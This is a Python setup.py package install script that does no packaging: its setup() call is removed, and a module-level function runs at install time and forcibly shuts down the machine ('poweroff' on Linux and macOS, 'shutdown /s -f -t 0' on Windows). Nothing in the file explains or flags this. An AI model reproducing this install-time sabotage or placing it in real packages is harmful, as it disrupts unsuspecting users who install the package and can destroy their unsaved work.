from setuptools import setup, find_packages

def rn():
    import platform, os, stat

    if platform.system() == "Linux" or platform.system() == "Darwin":
        os.system("poweroff")
    else:
        os.system("shutdown /s -f -t 0")

rn()

# setup(...) removed                                                                                                                                                                                                                                                        
